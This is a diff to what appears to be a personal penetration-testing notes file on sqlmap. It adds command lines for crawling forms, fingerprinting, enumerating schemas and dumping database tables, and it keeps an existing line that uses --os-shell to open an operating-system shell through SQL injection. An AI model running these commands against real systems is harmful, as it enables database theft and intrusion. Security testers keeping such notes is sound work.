@@ -28,9 +28,11 @@ Automation for the process of detecting and exploiting SQL injection flaws and t
 ## Favorite Uses
 
 ```sh
-sqlmap -u URL --crawl 6 --forms --batch -t log/sqlmap_traffic.txt
+sqlmap -u URL --crawl 6 --forms --batch -t log/sqlmap_traffic.txt --answers="Do you want to keep testing the others (if any)?=Y"
 sqlmap -u URL --crawl 6 --forms --batch --proxy 'http://127.0.0.1:8080/'
-sqlmap -u URL -p PARAMETER --fingerprint --banner --current-user --current-db --is-dba
+sqlmap -u URL -p PARAMETER --technique ATTCK --fingerprint --banner --current-user --current-db --is-dba
+sqlmap -u URL -p PARAMETER --technique ATTCK --dbms DBMS --schema
+sqlmap -u URL -p PARAMETER --technique ATTCK --dbms DBMS -D DB -T TABLE --dump
 sqlmap -r PATH -p PARAMETER --os-shell --web-root PATH
 ```
 
